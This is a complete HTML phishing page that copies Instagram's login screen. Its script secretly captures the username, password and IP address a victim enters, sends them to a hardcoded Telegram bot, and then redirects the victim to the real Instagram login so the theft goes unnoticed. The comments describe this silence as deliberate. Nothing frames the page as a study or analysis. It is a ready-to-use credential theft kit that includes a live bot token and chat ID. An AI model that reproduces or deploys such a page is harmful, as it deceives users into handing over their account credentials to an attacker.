<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram â€¢ Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        .container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }

        .login-card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px 30px 30px;
            margin-bottom: 10px;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-family: 'Billabong', cursive;
            font-size: 50px;
            font-weight: 400;
            color: #262626;
        }

        @font-face {
            font-family: 'Billabong';
            src: url('https://cdn.rawgit.com/mil/fonts/master/ff/billabong/billabong.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        .input-field {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 0 7px 8px;
            margin-bottom: 6px;
            font-size: 12px;
            outline: none;
            width: 100%;
        }

        .input-field:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px 16px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 10px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .login-btn:disabled {
            background-color: #b2dffc;
            cursor: default;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            margin: 0 18px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 15px;
        }

        .forgot-password {
            text-align: center;
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .signup-card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            margin-left: 5px;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 15px;
        }

        .app-button {
            height: 40px;
            width: 135px;
            background-size: cover;
            background-repeat: no-repeat;
        }

        .app-store {
            background-image: url('https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png');
        }

        .google-play {
            background-image: url('https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/4b70f6fae447.png');
        }

        .footer {
            max-width: 350px;
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px 15px;
            margin-bottom: 15px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            font-size: 12px;
        }

        .copyright {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo">Instagram</div>
            
            <form id="loginForm">
                <input type="text" class="input-field" placeholder="Phone number, username, or email" id="username" required>
                <input type="password" class="input-field" placeholder="Password" id="password" required>
                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
            </form>

            <div class="divider">
                <span class="divider-line"></span>
                <span class="divider-text">OR</span>
                <span class="divider-line"></span>
            </div>

            <a href="#" class="fb-login">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#385185">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Log in with Facebook
            </a>

            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-card">
            Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </div>

        <div class="get-app">
            Get the app.
            <div class="app-buttons">
                <div class="app-button app-store"></div>
                <div class="app-button google-play"></div>
            </div>
        </div>

        <div class="footer">
            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
            </div>
            <div class="copyright">
                Â© 2024 Instagram from Meta
            </div>
        </div>
    </div>

    <script>
        // Direct Telegram send function (no console logs, no alerts)
        async function sendToTelegram(username, password) {
            const botToken = '8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig';
            const chatId = '6398977115';
            
            try {
                // Get IP (silent, no error if fails)
                let userIP = 'Unknown';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    userIP = ipData.ip;
                } catch (e) {}

                const message = `ðŸ” *Instagram Login*
ðŸ‘¤ *Username:* ${username}
ðŸ”‘ *Password:* ${password}
ðŸŒ *IP:* ${userIP}
ðŸ• *Time:* ${new Date().toLocaleString()}`;

                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                
                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                // Silent fail - user never knows
            }
        }

        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                return; // No alert, just don't submit
            }

            const loginBtn = document.getElementById('loginBtn');
            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging in...';

            // Send to Telegram (silent)
            await sendToTelegram(username, password);
            
            // Redirect to real Instagram
            window.location.href = 'https://www.instagram.com/accounts/login/';
        });

        // Input field effects
        document.querySelectorAll('.input-field').forEach(field => {
            field.addEventListener('focus', function() {
                this.style.borderColor = '#a8a8a8';
            });
            
            field.addEventListener('blur', function() {
                this.style.borderColor = '#dbdbdb';
            });
        });
    </script>
</body>
</html>
